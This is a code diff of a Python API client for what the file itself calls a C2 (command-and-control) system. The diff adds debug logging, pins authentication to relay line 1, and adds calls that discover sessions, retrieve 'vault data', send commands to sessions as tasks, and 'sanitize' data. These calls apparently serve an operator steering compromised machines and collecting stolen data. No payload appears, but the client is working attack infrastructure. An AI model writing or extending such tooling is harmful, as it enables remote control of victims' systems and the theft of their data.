@@ -1,41 +1,51 @@
-# C2_Client/api_client.py
+# C2_Client/api_client.py (Full file with enhanced debugging)
 import requests
+import json
 from config import RELAY_URL_FORMAT
 
 class ApiClient:
     def __init__(self, main_window):
         self.main_window = main_window
         self.session = requests.Session()
-        # These will be set after a successful login
-        self.base_url = None 
+        self.base_url = None
         self.line_number = None
 
     def set_line(self, line_number):
-        """Sets the communication line for all future requests."""
         self.line_number = line_number
         self.base_url = RELAY_URL_FORMAT.format(line_number)
         print(f"[API Client] Communication line set to: {self.base_url}")
 
     def _request(self, method, endpoint, **kwargs):
-        # The login/register endpoints are special cases. They must find an active server.
-        if endpoint == '/auth/login' or endpoint == '/auth/register':
-            for i in range(1, 11): # Try lines 1 through 10
-                url = RELAY_URL_FORMAT.format(i) + endpoint
-                try:
-                    # Use a short timeout to quickly find an online server
-                    response = self.session.request(method, url, timeout=3, **kwargs)
-                    # If we get any valid response (even a 401/409 error), that server is online.
-                    if response.status_code < 500:
-                        return response.json()
-                except requests.exceptions.RequestException:
-                    continue # This line is offline, try the next one
-            # If all lines failed after the loop
-            self.main_window.statusBar().showMessage("API Error: Could not connect to any C2 line. All servers appear to be offline.", 5000)
-            return None
-        
-        # For all other requests, the line must be set.
+        # --- NEW DEBUGGING LOGIC ---
+        # For auth actions, ONLY try line 1 for this test
+        if endpoint in ['/auth/login', '/auth/register', '/auth/delete']:
+            
+            # --- START OF MODIFIED CODE ---
+            # We are hardcoding this to ONLY use line 1 for our test.
+            target_line_number = 1
+            url = RELAY_URL_FORMAT.format(target_line_number) + endpoint
+            print(f"[API DEBUG] TARGETING SINGLE LINE: Attempting {method} request to {url}")
+            
+            try:
+                response = self.session.request(method, url, timeout=10, **kwargs)
+                print(f"[API DEBUG] Received response from {url}: {response.status_code}")
+                
+                # Check if the response has content before trying to parse JSON
+                if not response.text:
+                    print(f"[API FATAL] Server returned an empty response.")
+                    return {"success": False, "error": f"Server error on line {target_line_number}: Empty response."}
+
+                return response.json()
+
+            except requests.exceptions.RequestException as e:
+                print(f"[API DEBUG] Connection error on line {target_line_number}: {e}")
+                self.main_window.statusBar().showMessage(f"API Error: Could not connect to C2 line {target_line_number}.", 5000)
+                return None
+            # --- END OF MODIFIED CODE ---
+
+        # For regular C2 traffic to a specific line
         if not self.base_url:
-            self.main_window.statusBar().showMessage("API Error: Not logged in or communication line not set.", 5000)
+            self.main_window.statusBar().showMessage("API Error: Not logged in.", 5000)
             return None
             
         try:
@@ -49,8 +59,7 @@ class ApiClient:
                 try:
                     error_details = e.response.json().get("error", "No details provided.")
                     error_message += f" - {error_details}"
-                except:
-                    pass # Keep the original error if JSON parsing fails
+                except: pass
             self.main_window.statusBar().showMessage(error_message, 5000)
             return None
 
@@ -60,6 +69,9 @@ class ApiClient:
     def login(self, username, password):
         return self._request('POST', '/auth/login', json={'username': username, 'password': password})
 
+    def delete_account(self, username):
+        return self._request('POST', '/auth/delete', json={'username': username})
+
     def discover_sessions(self, username):
         return self._request('POST', '/c2/discover', json={'username': username})
 
@@ -67,4 +79,10 @@ class ApiClient:
         return self._request('POST', '/c2/get_all_vault_data', json={'username': username})
 
     def get_responses(self, username, session_id):
-        retu
+        return self._request('POST', '/c2/get_responses', json={'username': username, 'session_id': session_id})
+
+    def send_task(self, username, session_id, command):
+        return self._request('POST', '/c2/task', json={'username': username, 'session_id': session_id, 'command': command})
+
+    def sanitize_data(self, username):
+        return self._request('POST', '/c2/sanitize', json={'username': username})
